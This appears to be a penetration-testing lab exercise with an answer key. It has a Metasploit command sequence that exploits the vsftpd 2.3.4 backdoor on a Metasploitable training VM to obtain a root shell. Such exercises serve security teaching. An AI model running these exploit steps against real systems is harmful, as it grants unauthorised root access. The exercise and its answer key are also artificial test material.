title: Exploit vsftpd with Metasploit
description: Use Metasploit to gain a root shell via vsftpd backdoor.
problemStatement:
# Objective
Gain a root shell on the Metasploitable VM by exploiting the vsftpd 2.3.4 backdoor using Metasploit.

## Steps
1.  Ensure Metasploitable VM is running and reachable from Kali.
2.  Launch `msfconsole`.
3.  Search for the `vsftpd` exploit module.
4.  Select the module and set the `RHOSTS` option to the Metasploitable IP address.
5.  Run the `check` command to confirm vulnerability.
6.  Execute the exploit (`run` or `exploit`).
7.  Once you have a shell, run the `whoami` and `id` commands to verify root access.
8.  Background the session with `Ctrl+Z`.

## Deliverable
Screenshot or text showing the output of `whoami` returning `root`.
solutionCode:
msf6 > search vsftpd
msf6 > use 0
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > check
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
whoami
id
# Press Ctrl+Z to background session
